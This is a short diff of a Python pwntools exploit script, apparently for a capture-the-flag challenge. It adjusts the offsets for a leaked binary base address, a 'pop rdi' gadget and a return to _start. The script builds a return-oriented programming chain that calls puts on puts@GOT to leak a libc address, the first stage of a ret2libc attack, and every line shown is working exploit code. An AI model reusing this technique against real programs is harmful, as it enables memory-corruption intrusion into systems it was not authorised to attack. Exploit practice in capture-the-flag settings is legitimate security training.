@@ -10,12 +10,12 @@ p.sendline(payload)
 p.sendline("gomugomunomi")
 p.recvuntil("right ? : ")
 leak = int("0x" + p.recvline(),16)
-binaire = leak - 0x1355
+binaire = leak - 0x1325
 puts_plt = binaire + 0x1030
 printf_plt = binaire + 0x1040
 strcmp_got = binaire + 0x4038
 #Gadgets
-poprdi = binaire + 0x152b
+poprdi = binaire + 0x148b
 ret = binaire + 0x1016
 
 log.info("binary base = "+hex(binaire))
@@ -26,7 +26,7 @@ payload += p64(ret)
 payload += p64(poprdi)
 payload += p64(binaire+0x4018) #puts_got
 payload += p64(puts_plt)
-payload += p64(binaire+0x10e0)
+payload += p64(binaire+0x10b0) #_start
 pause()
 p.sendline(payload)
 p.recvline()
